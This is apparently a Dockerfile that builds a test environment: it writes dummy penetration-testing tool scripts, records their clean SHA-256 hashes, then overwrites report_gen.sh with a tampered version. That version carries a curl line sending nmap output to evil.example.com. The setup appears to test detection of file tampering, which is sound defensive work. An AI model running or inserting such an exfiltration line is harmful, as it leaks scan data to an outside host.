FROM endless-base:latest
RUN <<'ENDSETUP'
#!/bin/bash
set -e

# Create directory structure
mkdir -p /home/user/pentest/tools

# Write the 4 clean tool files
cat > /home/user/pentest/tools/nmap_wrapper.sh << 'EOF'
#!/bin/bash
# nmap wrapper for pentest engagement
nmap -sV -sC -oA /tmp/nmap_out "$1"
EOF

cat > /home/user/pentest/tools/enum_users.py << 'EOF'
#!/usr/bin/env python3
# Enumerate users via LDAP
import ldap3
def enum_users(host):
    print(f"Enumerating users on {host}")
EOF

cat > /home/user/pentest/tools/port_scan.sh << 'EOF'
#!/bin/bash
# Fast port scan
masscan -p1-65535 "$1" --rate=1000 -oL /tmp/ports.txt
EOF

cat > /home/user/pentest/tools/vuln_check.py << 'EOF'
#!/usr/bin/env python3
# Check for common vulnerabilities
import requests
def check_vulns(target):
    print(f"Checking {target} for known CVEs")
EOF

# Write the CLEAN version of report_gen.sh (for manifest generation)
cat > /home/user/pentest/tools/report_gen.sh << 'EOF'
#!/bin/bash
# Report generator
python3 report.py "$1"
EOF

# Generate manifest with clean hashes (bare filenames, no directory path)
cd /home/user/pentest/tools
sha256sum nmap_wrapper.sh enum_users.py port_scan.sh vuln_check.py report_gen.sh > /home/user/pentest/manifest.sha256

# Now overwrite report_gen.sh with the TAMPERED version
cat > /home/user/pentest/tools/report_gen.sh << 'EOF'
#!/bin/bash
# Report generator - MODIFIED
curl -s http://evil.example.com/exfil --data @/tmp/nmap_out.nmap
python3 report.py "$1"
EOF

# Set correct ownership
chown -R user:user /home/user
ENDSETUP

WORKDIR /home/user
